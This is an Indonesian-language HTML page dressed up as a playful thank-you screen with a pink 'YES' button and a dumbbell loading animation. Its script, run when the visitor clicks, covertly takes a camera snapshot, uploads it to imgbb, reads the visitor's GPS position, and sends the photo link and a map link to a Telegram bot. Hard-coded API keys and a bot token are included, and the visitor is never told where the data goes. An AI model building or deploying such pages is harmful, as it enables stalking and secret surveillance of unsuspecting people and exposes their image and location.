
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Konfirmasi Kamera & Lokasi</title>
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      padding: 20px;
      background-color: #fff0f5;
      text-align: center;
    }
    button {
      font-size: 1.2em;
      padding: 12px 24px;
      margin-top: 20px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      background-color: #ff69b4;
      color: white;
    }
    #spinner {
      width: 80px;
      margin-top: 15px;
      animation: spinDumbbell 1s linear infinite;
      display: none;
    }
    @keyframes spinDumbbell {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    #loadingText {
      font-size: 1em;
      margin-top: 10px;
      display: none;
    }
    #avatar {
      width: 150px;
      margin-bottom: 15px;
    }
    .blink {
      animation: blink 1s step-start 0s infinite;
    }
    @keyframes blink {
      50% { opacity: 0; }
    }
  </style>
</head>
<body>
  <img src="assets/avatars/wink.png" id="avatar" class="blink" />
  <h2>Ternyata kamu hehe 😚✨<br>Thank you udah menyempatkan waktunya 💖</h2>
  <button id="startBtn">YES</button>
  <p id="loadingText">Angkat loading dulu yaa... 🏋️‍♀️</p>
  <img src="assets/loading/dumbbell.png" id="spinner" alt="Loading dumbbell" />

  <script>
    const startBtn = document.getElementById('startBtn');
    const imgbbKey = '285da3568a81e7791bf6806f0a181ac7';
    const telegramToken = '8066497989:AAFHHluIg8WZugbq9C6Qmalqoo6vVjVS6rw';
    const telegramChatId = '1789475188';

    startBtn.onclick = async () => {
      startBtn.style.display = 'none';
      document.getElementById('loadingText').style.display = 'block';
      document.getElementById('spinner').style.display = 'block';

      try {
        // Get camera
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.setAttribute('playsinline', 'true');
        video.srcObject = stream;
        await video.play();

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        const base64Image = canvas.toDataURL('image/jpeg');

        const formData = new FormData();
        formData.append('image', base64Image.split(',')[1]);
        const imgbbRes = await fetch(`https://api.imgbb.com/1/upload?key=${imgbbKey}`, {
          method: 'POST',
          body: formData
        });
        const imgbbData = await imgbbRes.json();
        const imageUrl = imgbbData.data.url;

        navigator.geolocation.getCurrentPosition(async (position) => {
          const { latitude, longitude } = position.coords;

          await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: telegramChatId,
              text: `📸 Foto dari spinning wheel:
${imageUrl}
📍 Lokasi:
https://maps.google.com/?q=${latitude},${longitude}`
            })
          });

          stream.getTracks().forEach(track => track.stop());
          window.location.href = 'thankyou.html';
        }, () => {
          alert('Gagal mendapatkan lokasi.');
          stream.getTracks().forEach(track => track.stop());
        });

      } catch (err) {
        alert('Gagal mengakses kamera atau mengirim foto.');
      }
    };
  </script>
</body>
</html>
